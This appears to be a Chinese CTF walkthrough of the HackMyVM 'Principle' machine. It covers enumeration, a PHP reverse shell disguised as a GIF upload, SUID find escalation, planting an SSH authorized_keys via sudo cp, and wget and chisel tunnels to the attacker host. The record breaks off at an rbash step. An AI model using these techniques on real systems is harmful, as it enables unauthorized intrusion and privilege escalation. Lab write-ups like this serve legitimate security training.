---
title: Principle
author: hgbe02
date: 2024-04-21
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Principle.html"
---

# Principle

![image-20240421191817119](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404212112898.png)

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404212112900.png" alt="image-20240421191919853" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
rustscan -a 192.168.0.101 -- -A

Open 192.168.0.101:80

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.22.1
| http-robots.txt: 1 disallowed entry 
|_/hackme
|_http-title: Welcome to nginx!
```

### 目录扫描

```bash
┌──(kali💀kali)-[~/temp/Principle]
└─$ gobuster dir -u http://192.168.0.101/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,bak,jpg,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.101/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,zip,bak,jpg,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/robots.txt           (Status: 200) [Size: 68]
/hi.html              (Status: 200) [Size: 141]
Progress: 1543920 / 1543927 (100.00%)
===============================================================
Finished
===============================================================
```

## 漏洞发现

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404212112901.png" alt="image-20240421192351575" style="zoom:50%;" />

### 敏感目录

```apl
http://192.168.0.101/robots.txt
```

```text
User-agent: *
Allow: /hi.html
Allow: /investigate
Disallow: /hackme
```

```apl
http://192.168.0.101/hi.html
```

```text
- Who I am?
- You are a automaton
- Are you sure?
- Yep
- Thank you, who has created me?
- They say Elohim
```

```apl
http://192.168.0.101/investigate/
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404212112902.png" alt="image-20240421192532707" style="zoom:50%;" />

```text
<!-- If you like research, I will try to help you to solve the enigmas, try to search for documents in this directory -->
```

### 信息搜集

按照它给的信息进行信息搜集：

```bash
┌──(kali💀kali)-[~/temp/Principle]
└─$ gobuster dir -u http://192.168.0.101/investigate/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,bak,jpg,txt,html===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.101/investigate/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php,zip,bak,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 812]
/rainbow_mystery.txt  (Status: 200) [Size: 596]
Progress: 1543920 / 1543927 (100.00%)
===============================================================
Finished
===============================================================
```

### 解密

看一下这是个啥：

```bash
┌──(kali💀kali)-[~/temp/Principle]
└─$ curl http://192.168.0.101/investigate/rainbow_mystery.txt
QWNjb3JkaW5nIHRvIHRoZSBPbGQgVGVzdGFtZW50LCB0aGUgcmFpbmJvdyB3YXMgY3JlYXRlZCBi
eSBHb2QgYWZ0ZXIgdGhlIHVuaXZlcnNhbCBGbG9vZC4gSW4gdGhlIGJpYmxpY2FsIGFjY291bnQs
IGl0IHdvdWxkIGFwcGVhciBhcyBhIHNpZ24gb2YgdGhlIGRpdmluZSB3aWxsIGFuZCB0byByZW1p
bmQgbWVuIG9mIHRoZSBwcm9taXNlIG1hZGUgYnkgR29kIGhpbXNlbGYgdG8gTm9haCB0aGF0IGhl
IHdvdWxkIG5ldmVyIGFnYWluIGRlc3Ryb3kgdGhlIGVhcnRoIHdpdGggYSBmbG9vZC4KTWF5YmUg
dGhhdCdzIHdoeSBJIGFtIGEgcm9ib3Q/Ck1heWJlIHRoYXQgaXMgd2h5IEkgYW0gYWxvbmUgaW4g
dGhpcyB3b3JsZD8KClRoZSBhbnN3ZXIgaXMgaGVyZToKLS4uIC0tLSAtLSAuLSAuLiAtLiAvIC0g
Li4uLi0gLi0uLiAtLS0tLSAuLi4gLi0uLS4tIC4uLi4gLS0gLi4uLQo=
```

解密一下：

**From_Base64('A-Za-z0-9+/=',true,false)**

```text
According to the Old Testament, the rainbow was created by God after the universal Flood. In the biblical account, it would appear as a sign of the divine will and to remind men of the promise made by God himself to Noah that he would never again destroy the earth with a flood.
Maybe that's why I am a robot?
Maybe that is why I am alone in this world?

The answer is here:
-.. --- -- .- .. -. / - ....- .-.. ----- ... .-.-.- .... -- ...-
```

**From_Morse_Code('Space','Line feed')**

```bash
DOMAINT4L0S.HMV
```

添加host记录：

```apl
192.168.0.101   t4l0s.hmv
```

```bash
┌──(root㉿kali)-[/home/kali/temp/Principle]
└─# curl http://t4l0s.hmv                                 <!DOCTYPE html>
<html>
<head>
  <title>Console</title>
  <style>
    body {
      background-color: #000;
      color: #0F0;
      font-family: monospace;
      font-size: 14px;
      padding: 20px;
    }

    .console-text {
      white-space: pre;
    }

    .console-text:before {
      content: ;
      color: #0F0;
    }
  </style>
</head>
<body>
  <div class="console-text">
[elohim@principle ~]$ echo "My son, you were born of dust and walk in my garden. Hear now my voice, I am your creator, and I am called $(whoami)."
My son, you were born of dust and walk in my garden. Hear now my voice, I am your creator, and I am called elohim.
<! Elohim is a liar and you must not listen to him, he is not here but it is possible to find him, you must look somewhere else. ->


               ,,ggddY888Ybbgg,,
          ,agd8""'   .d8888888888bga,
       ,gdP""'     .d88888888888888888g,
     ,dP"        ,d888888888888888888888b,
   ,dP"         ,8888888888888888888888888b,
  ,8"          ,8888888P"""88888888888888888,
 ,8'           I888888I    )88888888888888888,
,8'            `8888888booo8888888888888888888,
d'              `88888888888888888888888888888b
8                `"8888888888888888888888888888
8                  `"88888888888888888888888888
8                      `"8888888888888888888888
Y,                        `8888888888888888888P
`8,                         `88888888888888888'
 `8,              .oo.       `888888888888888'
  `8a             8888        88888888888888'
   `Yba           `""'       ,888888888888P'
     "Yba                   ,88888888888'
       `"Yba,             ,8888888888P"'                
          `"Y8baa,      ,d88888888P"'
               ``""YYba8888P888"'
  </div>
</body>
</html>
```

### FUZZ

尝试fuzz一下dns记录！

```bash
┌──(root㉿kali)-[/home/kali/temp/Principle]
└─# ffuf -u http://t4l0s.hmv -H 'Host: FUZZ.t4l0s.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 615

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://t4l0s.hmv
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.t4l0s.hmv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 615
________________________________________________

hellfire                [Status: 200, Size: 1659, Words: 688, Lines: 52, Duration: 8ms]
:: Progress: [114441/114441] :: Job [1/1] :: 9523 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

添加dns记录：

```apl
192.168.0.101   hellfire.t4l0s.hmv
```

```bash
┌──(root㉿kali)-[/home/kali/temp/Principle]
└─# curl http://hellfire.t4l0s.hmv
<!DOCTYPE html>
<html>
<head>
  <title>Console</title>
  <style>
    body {
      background-color: #000;
      color: #0F0;
      font-family: monospace;
      font-size: 14px;
      padding: 20px;
    }

    .console-text {
      white-space: pre;
    }

    .console-text:before {
      content: ;
      color: #0F0;
    }
  </style>
</head>
<body>
  <div class="console-text">
[elohim@principle ~]$ echo "Road to $HOME, but you don't have access to the System. You should not look for the way, you have been warned." 
Road to /gehenna, but you don't have access to the System. You should not look for the way, you have been warned.
<! You're on the right track, he's getting angry! ->


                         ______                     
 _________        .---"""      """---.              
:______.-':      :  .--------------.  :             
| ______  |      | :                : |             
|:______B:|      | |  SON,          | |             
|:______B:|      | |                | |             
|:______B:|      | |  YOU don't     | |             
|         |      | |  access.       | |             
|:_____:  |      | |                | |             
|    ==   |      | :                : |             
|       O |      :  '--------------'  :             
|       o |      :'---...______...---'              
|       o |-._.-i___/'             \._              
|'-.____o_|   '-.   '-...______...-'  `-._          
:_________:      `.____________________   `-.___.-. 
                 .'.eeeeeeeeeeeeeeeeee.'.      :___:
               .'.eeeeeeeeeeeeeeeeeeeeee.'.         
              :____________________________:"
  </div>
</body>
</html>
```

尝试扫描一下：

```bash
┌──(root㉿kali)-[/home/kali/temp/Principle]
└─# gobuster dir -u http://hellfire.t4l0s.hmv -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,html,jpg,txt,bak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hellfire.t4l0s.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,zip,html,jpg,txt,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 1659]
/upload.php           (Status: 200) [Size: 748]
/output.php           (Status: 200) [Size: 1350]
/archivos             (Status: 301) [Size: 169] [--> http://hellfire.t4l0s.hmv/archivos/]
Progress: 1543920 / 1543927 (100.00%)
===============================================================
Finished
===============================================================
```

发现：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404212112903.png" alt="image-20240421195828699" style="zoom: 33%;" />

尝试抓包上传伪装的反弹shell！

```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# vim reverseShell.gif

┌──(root㉿kali)-[/home/kali/Downloads]
└─# head reverseShell.gif
GIF89a
  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '192.168.0.143';  // You have changed this
  $port = 1234;  // And this
  $chunk_size = 1400;
```

修改一下包：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404212112904.png" alt="image-20240421200543101" style="zoom:50%;" />

然后发送过去！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404212112905.png" alt="image-20240421200614088" style="zoom:50%;" />

访问激活即可！

```bash
curl http://hellfire.t4l0s.hmv/archivos/reverseShell.php
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404212112906.png" alt="image-20240421200853991" style="zoom:33%;" />

## 提权

### 信息搜集

```bash
(remote) www-data@principle:/$ sudo -l
[sudo] password for www-data: 
sudo: a password is required
(remote) www-data@principle:/$ ls -la
total 68
drwxr-xr-x  18 root root  4096 Jul 11  2023 .
drwxr-xr-x  18 root root  4096 Jul 11  2023 ..
lrwxrwxrwx   1 root root     7 Jun 30  2023 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Jul 11  2023 boot
drwxr-xr-x  17 root root  3300 Apr 21 07:13 dev
drwxr-xr-x  71 root root  4096 Apr 21 07:13 etc
drwxr-xr-x   4 root root  4096 Jul  4  2023 home
lrwxrwxrwx   1 root root    29 Jul 11  2023 initrd.img -> boot/initrd.img-6.1.0-9-amd64
lrwxrwxrwx   1 root root    29 Jun 30  2023 initrd.img.old -> boot/initrd.img-6.1.0-9-amd64
lrwxrwxrwx   1 root root     7 Jun 30  2023 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Jun 30  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Jun 30  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Jun 30  2023 libx32 -> usr/libx32
drwx------   2 root root 16384 Jun 30  2023 lost+found
drwxr-xr-x   3 root root  4096 Jun 30  2023 media
drwxr-xr-x   2 root root  4096 Jun 30  2023 mnt
drwxr-xr-x   2 root root  4096 Jul  7  2023 opt
dr-xr-xr-x 143 root root     0 Apr 21 07:13 proc
drwx------   5 root root  4096 Jul 14  2023 root
drwxr-xr-x  18 root root   540 Apr 21 07:13 run
lrwxrwxrwx   1 root root     8 Jun 30  2023 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Jun 30  2023 srv
dr-xr-xr-x  13 root root     0 Apr 21 07:13 sys
drwxrwxrwt   8 root root  4096 Apr 21 08:09 tmp
drwxr-xr-x  14 root root  4096 Jun 30  2023 usr
drwxr-xr-x  12 root root  4096 Jun 30  2023 var
lrwxrwxrwx   1 root root    26 Jul 11  2023 vmlinuz -> boot/vmlinuz-6.1.0-9-amd64
lrwxrwxrwx   1 root root    26 Jun 30  2023 vmlinuz.old -> boot/vmlinuz-6.1.0-9-amd64
(remote) www-data@principle:/$ cd /home
(remote) www-data@principle:/home$ ls -la
total 16
drwxr-xr-x  4 root   root   4096 Jul  4  2023 .
drwxr-xr-x 18 root   root   4096 Jul 11  2023 ..
drwxr-xr-x  4 elohim elohim 4096 Jul 14  2023 gehenna
drwxr-xr-x  4 talos  talos  4096 Jul 14  2023 talos
(remote) www-data@principle:/home$ cd gehenna/
(remote) www-data@principle:/home/gehenna$ ls -la
total 40
drwxr-xr-x 4 elohim elohim 4096 Jul 14  2023 .
drwxr-xr-x 4 root   root   4096 Jul  4  2023 ..
-rw------- 1 elohim elohim  289 Jul 14  2023 .bash_history
-rw-r----- 1 elohim elohim  261 Jul  5  2023 .bash_logout
-rw-r----- 1 elohim elohim 3830 Jul 14  2023 .bashrc
drw-r----- 3 elohim elohim 4096 Jul  2  2023 .local
-rw-r----- 1 elohim elohim   21 Jul 12  2023 .lock
-rw-r----- 1 elohim elohim  807 Jul  6  2023 .profile
drwx------ 2 elohim elohim 4096 Jul  6  2023 .ssh
-rw-r----- 1 elohim elohim  777 Jul 13  2023 flag.txt
(remote) www-data@principle:/home/gehenna$ cd ../talos/
(remote) www-data@principle:/home/talos$ ls -la
total 40
drwxr-xr-x 4 talos talos 4096 Jul 14  2023 .
drwxr-xr-x 4 root  root  4096 Jul  4  2023 ..
-rw-r--r-- 1 talos talos    1 Jul 14  2023 .bash_history
-rw-r----- 1 talos talos  261 Jul  5  2023 .bash_logout
-rw-r----- 1 talos talos 3545 Jul 14  2023 .bashrc
-rw------- 1 talos talos   20 Jul  4  2023 .lesshst
drw-r----- 3 talos talos 4096 Jun 30  2023 .local
-rw-r----- 1 talos talos  807 Jun 30  2023 .profile
drwx------ 2 talos talos 4096 Jul 14  2023 .ssh
-rw-r----- 1 talos talos  320 Jul 13  2023 note.txt
(remote) www-data@principle:/home/talos$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/find
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/newgrp
```

### 提权至talos

发现`find`存在`suid`权限：https://gtfobins.github.io/gtfobins/find/#suid

```bash
(remote) www-data@principle:/home/talos$ /usr/bin/find . -exec /bin/sh -p \; -quit
\[\](remote)\[\] \[\]talos@principle\[\]:\[\]/home/talos\[\]$ 
(local) pwncat$                                                                                                                                         
(remote) talos@principle:/home/talos$
```

```bash
(remote) talos@principle:/home/talos$ ls -la
total 40
drwxr-xr-x 4 talos talos 4096 Jul 14  2023 .
drwxr-xr-x 4 root  root  4096 Jul  4  2023 ..
-rw-r--r-- 1 talos talos    1 Jul 14  2023 .bash_history
-rw-r----- 1 talos talos  261 Jul  5  2023 .bash_logout
-rw-r----- 1 talos talos 3545 Jul 14  2023 .bashrc
-rw------- 1 talos talos   20 Jul  4  2023 .lesshst
drw-r----- 3 talos talos 4096 Jun 30  2023 .local
-rw-r----- 1 talos talos  807 Jun 30  2023 .profile
drwx------ 2 talos talos 4096 Jul 14  2023 .ssh
-rw-r----- 1 talos talos  320 Jul 13  2023 note.txt
(remote) talos@principle:/home/talos$ cat note.txt
Congratulations! You have made it this far thanks to the manipulated file I left you, I knew you would make it!
Now we are very close to finding this false God Elohim.
I left you a file with the name of one of the 12 Gods of Olympus, out of the eye of Elohim ;)
The tool I left you is still your ally. Good luck to you.
(remote) talos@principle:/home/talos$ id
uid=33(www-data) gid=33(www-data) euid=1000(talos) groups=33(www-data)
```

查一下他说的`12 Gods of Olympus`：

```apl
Afrodita
Apolo
Zeus
Hera
Poseidon
Ares
Atenea
Hermes
Artemisa
Hefesto
Demeter
Hestia
```

利用这个名单进行查找：

```bash
(remote) talos@principle:/tmp$ for line in $(cat name.txt); do find / -iname *$line* 2>/dev/null; done
```

看下有啥：

```bash
/etc/selinux/Afrodita.key
/usr/lib/modules/6.1.0-9-amd64/kernel/drivers/power/supply/cros_peripheral_charger.ko
/usr/share/zoneinfo/Antarctica/Rothera
/usr/share/zoneinfo/right/Antarctica/Rothera
/usr/share/zoneinfo/Europe/Bucharest
/usr/share/zoneinfo/right/Europe/Bucharest
```

查看一下第一个！

```bash
(remote) talos@principle:/tmp$ cat /etc/selinux/Afrodita.key
Here is my password:
Hax0rModeON

Now I have done another little trick to help you reach Elohim.
REMEMBER: You need the access key and open the door. Anyway, he has a bad memory and that's why he keeps the lock coded and hidden at home.
```

切换一下用户！

```bash
(remote) talos@principle:/tmp$ su talos
Password: 
talos@principle:/tmp$ whoami;id
talos
uid=1000(talos) gid=1000(talos) groups=1000(talos),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

至此，我们才真正拿到了`talos`用户！

至于上面提示说的`lock`，我们可以直接cp出来：

```bash
(remote) talos@principle:/home/talos$ cd ..
(remote) talos@principle:/home$ ls
gehenna  talos
(remote) talos@principle:/home$ cd talos/
(remote) talos@principle:/home/talos$ touch .lock
(remote) talos@principle:/home/talos$ sudo -u elohim cp /home/gehenna/.lock .
(remote) talos@principle:/home/talos$ cat .lock
7072696e6369706c6573
```

### 进一步提权

```bash
talos@principle:/tmp$ sudo -l
Matching Defaults entries for talos on principle:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User talos may run the following commands on principle:
    (elohim) NOPASSWD: /bin/cp
```

buff叠满了，继续爽！刚做完`Five`，一样的套路！

```bash
┌──(root㉿kali)-[/home/kali/temp/Principle]
└─# ssh-keygen -t rsa -b 4096 -f /home/kali/temp/Principle/elohim
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/temp/Principle/elohim
Your public key has been saved in /home/kali/temp/Principle/elohim.pub
The key fingerprint is:
SHA256:U18TTdifQW72bKd63CQSpODqaLDPfQRggJHraTjDVK8 root@kali
The key's randomart image is:
+---[RSA 4096]----+
|.+..          o*.|
|o  .o   .   . ooo|
| ..... . ..o  o++|
|..   .. ......o+o|
|= . .  oS   ..  =|
|+=.E  . ..  . .oo|
|.o o o .     o.+ |
|  ..o.. .    .o .|
|   oo ..    ..   |
+----[SHA256]-----+

┌──(root㉿kali)-[/home/kali/temp/Principle]
└─# mv elohim.pub authorized_keys       

┌──(root㉿kali)-[/home/kali/temp/Principle]
└─# python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
192.168.0.101 - - [21/Apr/2024 08:37:15] "GET /authorized_keys HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
```

```bash
talos@principle:/tmp$ ss -tnlup
Netid          State           Recv-Q          Send-Q                   Local Address:Port                   Peer Address:Port         Process          
udp            UNCONN          0               0                              0.0.0.0:68                          0.0.0.0:*                             
tcp            LISTEN          0               128                            0.0.0.0:3445                        0.0.0.0:*                             
tcp            LISTEN          0               511                            0.0.0.0:80                          0.0.0.0:*                             
tcp            LISTEN          0               128                               [::]:3445                           [::]:*                             
tcp            LISTEN          0               511                               [::]:80                             [::]:*                             
talos@principle:/tmp$ nc 0.0.0.0 3445
SSH-2.0-OpenSSH_9.2p1 Debian-2
^C
talos@principle:/tmp$ cd /home
talos@principle:/home$ cd talos/
talos@principle:~$ ls -la
total 40
drwxr-xr-x 4 talos talos 4096 Jul 14  2023 .
drwxr-xr-x 4 root  root  4096 Jul  4  2023 ..
-rw-r--r-- 1 talos talos    1 Jul 14  2023 .bash_history
-rw-r----- 1 talos talos  261 Jul  5  2023 .bash_logout
-rw-r----- 1 talos talos 3545 Jul 14  2023 .bashrc
-rw------- 1 talos talos   20 Jul  4  2023 .lesshst
drw-r----- 3 talos talos 4096 Jun 30  2023 .local
-rw-r----- 1 talos talos  320 Jul 13  2023 note.txt
-rw-r----- 1 talos talos  807 Jun 30  2023 .profile
drwx------ 2 talos talos 4096 Jul 14  2023 .ssh
talos@principle:~$ cd /tmp
talos@principle:/tmp$ wget http://192.168.0.143:8888/authorized_keys
--2024-04-21 08:37:16--  http://192.168.0.143:8888/authorized_keys
Connecting to 192.168.0.143:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 735 [application/octet-stream]
Saving to: ‘authorized_keys’

authorized_keys                       100%[=========================================================================>]     735  --.-KB/s    in 0s      

2024-04-21 08:37:16 (32.1 MB/s) - ‘authorized_keys’ saved [735/735]

talos@principle:/tmp$ sudo -l
Matching Defaults entries for talos on principle:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User talos may run the following commands on principle:
    (elohim) NOPASSWD: /bin/cp
talos@principle:/tmp$ sudo -u elohim /bin/cp authorized_keys /home/gehenna/.ssh/authorized_keys
```

然后尝试ssh连接：

```bash
talos@principle:/tmp$ wget http://192.168.0.143:8888/elohim
--2024-04-21 08:41:34--  http://192.168.0.143:8888/elohim
Connecting to 192.168.0.143:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3369 (3.3K) [application/octet-stream]
Saving to: ‘elohim’

elohim                                100%[=========================================================================>]   3.29K  --.-KB/s    in 0s      

2024-04-21 08:41:34 (318 MB/s) - ‘elohim’ saved [3369/3369]

talos@principle:/tmp$ chmod 600 elohim 
talos@principle:/tmp$ ssh gehenna@127.0.0.1 -p 3445 -i elohim
bash: /usr/bin/ssh: Permission denied
```

啊，权限不够。。。。上传一个ssh给他用！这是比较省事的！

### 方法一：上传ssh

```bash
┌──(root㉿kali)-[/home/kali/temp/Principle]
└─# whereis ssh                            
ssh: /usr/bin/ssh /etc/ssh /usr/share/man/man1/ssh.1.gz

┌──(root㉿kali)-[/home/kali/temp/Principle]
└─# cp /usr/bin/ssh .

┌──(root㉿kali)-[/home/kali/temp/Principle]
└─# python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
192.168.0.101 - - [21/Apr/2024 08:47:02] "GET /ssh HTTP/1.1" 200 -
```

```bash
talos@principle:/tmp$ wget http://192.168.0.143:8888/ssh
--2024-04-21 08:47:03--  http://192.168.0.143:8888/ssh
Connecting to 192.168.0.143:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 986144 (963K) [application/octet-stream]
Saving to: ‘ssh’

ssh                                   100%[=========================================================================>] 963.03K  --.-KB/s    in 0.005s  

2024-04-21 08:47:03 (205 MB/s) - ‘ssh’ saved [986144/986144]

talos@principle:/tmp$ mv ssh newssh
talos@principle:/tmp$ chmod +x newssh
talos@principle:/tmp$ ./newssh gehenna@127.0.0.1 -p 3445 -i elohim
The authenticity of host '[127.0.0.1]:3445 ([127.0.0.1]:3445)' can't be established.
ED25519 key fingerprint is SHA256:DKEXWHITnUq09/ftlMqD6Eo+e5eQoeR+HWleDkUB9fw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:3445' (ED25519) to the list of known hosts.
gehenna@127.0.0.1's password: 

talos@principle:/tmp$ ./newssh elohim@127.0.0.1 -p 3445 -i elohim

Son, you didn't listen to me, and now you're trapped.
You've come a long way, but this is the end of your journey.

elohim@principle:~$ whoami;id
elohim
uid=1001(elohim) gid=1001(elohim) groups=1001(elohim),1002(sml)
```

### 方法二：内网穿透

使用`chisel`进行内网穿透一下，代理到本地进行连接，这是Hell中涉及到的方法！

```bash
(remote) talos@principle:/tmp$ ./chisel client 192.168.0.143:2345 R:3445:localhost:3445
Segmentation fault
(remote) talos@principle:/tmp$ ./chisel
Segmentation fault
(remote) talos@principle:/tmp$ cd /home/talos
(remote) talos@principle:/home/talos$ ls -la
total 40
drwxr-xr-x 4 talos talos 4096 Jul 14  2023 .
drwxr-xr-x 4 root  root  4096 Jul  4  2023 ..
-rw-r--r-- 1 talos talos    1 Jul 14  2023 .bash_history
-rw-r----- 1 talos talos  261 Jul  5  2023 .bash_logout
-rw-r----- 1 talos talos 3545 Jul 14  2023 .bashrc
-rw------- 1 talos talos   20 Jul  4  2023 .lesshst
drw-r----- 3 talos talos 4096 Jun 30  2023 .local
-rw-r----- 1 talos talos  320 Jul 13  2023 note.txt
-rw-r----- 1 talos talos  807 Jun 30  2023 .profile
drwx------ 2 talos talos 4096 Apr 21 08:48 .ssh
(remote) talos@principle:/home/talos$ cp /tmp/chisel .
(remote) talos@principle:/home/talos$ chmod +x chisel
(remote) talos@principle:/home/talos$ ./chisel client 192.168.0.143:2345 R:3445:0.0.0.0:3445
Segmentation fault
```

```bash
┌──(root㉿kali)-[/home/kali/temp/Principle]
└─# cp ../chisel .                 

┌──(root㉿kali)-[/home/kali/temp/Principle]
└─# chmod +x chisel 

┌──(root㉿kali)-[/home/kali/temp/Principle]
└─# ./chisel server --reverse -p 2345
2024/04/21 08:54:55 server: Reverse tunnelling enabled
2024/04/21 08:54:55 server: Fingerprint Si58S0/S2DhbvDVtV6f5tuz7G+DWmm8hbtu578EtVpQ=
2024/04/21 08:54:55 server: Listening on http://0.0.0.0:2345
```

不知道为啥发生了短错误，不纠结了，大概就是这样的。

### 提权

继续做吧：

```bash
(remote) talos@principle:/tmp$ ./newssh elohim@127.0.0.1 -p 3445 -i elohim


Son, you didn't listen to me, and now you're trapped.
You've come a long way, but this is the end of your journey.

elohim@principle:~$ sudo -l
Matching Defaults entries for elohim on principle:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User elohim may run the following commands on principle:
    (root) NOPASSWD: /usr/bin/python3 /opt/reviewer.py
elohim@principle:~$ ls -la
total 40
drwxr-xr-x 4 elohim elohim 4096 Jul 14  2023 .
drwxr-xr-x 4 root   root   4096 Jul  4  2023 ..
-rw------- 1 elohim elohim  289 Jul 14  2023 .bash_history
-rw-r----- 1 elohim elohim  261 Jul  5  2023 .bash_logout
-rw-r----- 1 elohim elohim 3830 Jul 14  2023 .bashrc
-rw-r----- 1 elohim elohim  777 Jul 13  2023 flag.txt
drw-r----- 3 elohim elohim 4096 Jul  2  2023 .local
-rw-r----- 1 elohim elohim   21 Jul 12  2023 .lock
-rw-r----- 1 elohim elohim  807 Jul  6  2023 .profile
drwx------ 2 elohim elohim 4096 Jul  6  2023 .ssh
elohim@principle:~$ cat flagbash: /dev/null: restricted: cannot redirect output
bash_completion: _upvars: `-a2': invalid number specifier
bash: /dev/null: restricted: cannot redirect output
bash_completion: _upvars: `-a0': invalid number specifier

rbash: cat:: No such file or directory
elohim@principle:~$ cat flag.txt
rbash: cat:: No such file or directory
```

是一个`rbash`：

```bash
elohim@principle:~$ ls -l /opt/reviewer.py
-rwxr-xr-x 1 root root 1072 Jul  7  2023 /opt/reviewer.py
elohim@principle:~$ cat /opt/reviewer.py
rbash: cat:: No such file or directory
elohim@principle:~$ busybox
BusyBox v1.35.0 (Debian 1:1.35.0-4+b3) multi-call binary.
BusyBox is copyrighted by many authors between 1998-2015.
Licensed under GPLv2. See source distribution for detailed
copyright notices.

Usage: busybox [function [arguments]...]
   or: busybox --list[-full]
   or: busybox --show SCRIPT
   or: busybox --install [-s] [DIR]
   or: function [arguments]...

        BusyBox is a multi-call binary that combines many common Unix
        utilities into a single executable.  Most people will create a
        link to busybox for each function they wish to use and BusyBox
        will act like whatever it was invoked as.

Currently defined functions:
        [, [[, acpid, adjtimex, ar, arch, arp, arping, ascii, ash, awk, base64, basename, bc, blkdiscard, blkid, blockdev, brctl, bunzip2, bzcat,
        bzip2, cal, cat, chgrp, chmod, chown, chroot, chvt, clear, cmp, cp, cpio, crc32, cttyhack, cut, date, dc, dd, deallocvt, depmod, devmem, df,
        diff, dirname, dmesg, dnsdomainname, dos2unix, du, dumpkmap, dumpleases, echo, egrep, env, expand, expr, factor, fallocate, false, fatattr,
        fdisk, fgrep, find, findfs, fold, free, freeramdisk, fsfreeze, fstrim, ftpget, ftpput, getopt, getty, grep, groups, gunzip, gzip, halt, head,
        hexdump, hostid, hostname, httpd, hwclock, i2cdetect, i2cdump, i2cget, i2cset, i2ctransfer, id, ifconfig, ifdown, ifup, init, insmod, ionice,
